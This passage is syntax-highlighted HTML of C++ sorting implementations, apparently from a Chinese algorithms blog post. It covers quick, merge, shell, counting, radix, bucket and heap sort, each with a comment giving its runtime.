punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">quickSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 归并排序（192 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">>=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> lnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> rnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> rnums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 归并排序 + 非递归（80 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeSortNR</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> n<span class="token operator">-</span>len<span class="token punctuation">;</span> l <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>len<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span>len<span class="token number">-1</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>len<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>                <span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">,</span> j <span class="token operator">=</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">[</span>i<span class="token operator">-</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 希尔排序（40 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">shellSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> gap <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> gap <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> gap <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> gap<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j<span class="token operator">-</span>gap <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> j <span class="token operator">-</span><span class="token operator">=</span> gap<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 计数排序（32 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">countSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> maxv<span class="token operator">-</span>minv<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> count<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">+</span>minv<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 基数排序（不适用于负数）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">radixSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxv <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            maxv <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>            maxd<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rank</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> base <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxd <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token number">-1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                rank<span class="token punctuation">[</span><span class="token operator">--</span>count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> rank<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            maxd<span class="token operator">--</span><span class="token punctuation">;</span>            base <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 桶排序 (20 ms)</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">bucketSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> bs <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token punctuation">(</span>maxv<span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> <span class="token function">bucket</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bucket<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> sz <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 堆排序（32 ms）</span>    <span class="token keyword">void</span> <span class="token function">adjust</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> c1 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c2 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token punctuation">(</span>c2<span class="token operator">&lt;</span>s <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>c2<span class="token punctuation">]</span><span class="token operator">></span>nums<span class="token punctuation">[</span>c1<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> c2 <span class="token operator">:</span> c1<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            p <span class="token operator">=</span> c<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">heapSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token number">-1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token 